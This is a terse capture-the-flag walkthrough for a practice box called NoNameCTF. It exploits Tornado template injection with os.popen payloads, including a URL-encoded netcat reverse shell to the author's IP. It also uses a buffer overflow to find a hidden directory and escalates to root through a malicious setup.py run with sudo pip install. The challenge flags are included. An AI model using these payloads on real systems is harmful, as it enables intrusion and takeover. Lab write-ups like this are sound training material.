# NoNameCTF 

> VOiD | Saturday 14 August 2021 06:52:16 PM IST

My IP : 10.11.43.119
Target IP : 10.10.64.212

# PORT 80

/
```
<!--char buffer[250]; -->
<!--A*1000-->

```



# PORT 9090
/
shows error
tornado
hidden directory from port 2222
```bash

/40b5dffec4e39b7a3e9d261d2fc4a038/
page source has comment => ?hackme= 
http://10.10.64.212:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={{2*3}}
Vulnerable to ssti

whenever we have ssti

{% import os %}{{ os.popen("whoami").read() }}

we can do hackme={%import os%}{{os.popen('whoami').read()}}
# it works
now reverse shell

http://10.10.64.212:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={%import%20os%}{{os.popen(%27nc%2010.11.43.119%204444%20-e%20%22/bin/bash%22%27).read()}}
```


```bash

user : zeldris
cat user.txt 
THM{SSTI_AND_BUFFER_OVERFLOW_W4S_HERE}

sudo -l
(root : root) NOPASSWD: /usr/bin/pip install *
priv esc

TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF

user : root
cat root.txt 
THN{F4KE_PIP_PACKAGE_INSTALL}

```










# PORT 2222
An application running taking input
overflowing store buffer function gives
```bash
python -c 'print "A"*1000+"B"*500'
nc 10.10.64.212 2222
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4

My secret in the port 9090 is: /40b5dffec4e39b7a3e9d261d2fc4a038/

```